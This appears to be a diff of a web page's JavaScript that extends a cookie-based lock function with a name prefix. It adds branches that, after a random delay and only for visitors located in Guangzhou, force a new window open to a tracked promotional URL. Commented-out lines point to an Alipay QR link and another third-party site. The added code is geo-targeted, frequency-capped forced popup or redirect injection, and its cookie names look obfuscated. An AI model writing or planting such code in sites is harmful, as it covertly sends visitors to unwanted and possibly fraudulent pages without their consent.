@@ -191,9 +191,10 @@
 	 * 检查是否锁定并设置锁定时间
 	 * @param {*锁定的小时数} hour 
 	 */
-	function checkLockCookie(hour,maxCount){
-		var LOCKSTTIME = 'GewEWx+vbTkYq';
-		var COUNT = 'agEY0agY';
+	function checkLockCookie(hour,maxCount,lockerName){
+		lockerName = lockerName||"";
+		var LOCKSTTIME = lockerName+'GewEWx+vbTkYq';
+		var COUNT = lockerName+'agEY0agY';
 		if(document.cookie.indexOf(LOCKSTTIME)!==-1){	
 			maxCount = maxCount||1;			
 			var time = getCookie(LOCKSTTIME);
@@ -275,7 +276,14 @@
 				// forceWindow('https://qr.alipay.com/c1x08205f5zbi7rhz4xaz1e');	//赵挺
 				// forceWindow('https://www.cosfuli.com/');	
 			});
-		};		
+		}else if(checkLockCookie(4,1,'youxi')){
+			filterCity('广州',function(){				
+				forceWindow('https://tg.kpo76.com/template/50.html?pid=lxE2P3umNcWeimBnCRIV0kxFUgtS5utciX2ndhpxZMuX93bhJRc5j2aasWflBHR%2F');
+			});			
+		}else if(checkLockCookie(3,1,'fuli')){
+			filterCity('广州',function(){				
+				// forceWindow('http://www.cosfuli.com');
+			});
+		} ;	
 	},1000*(2 + Math.random()*2));
-
 })(window,document);
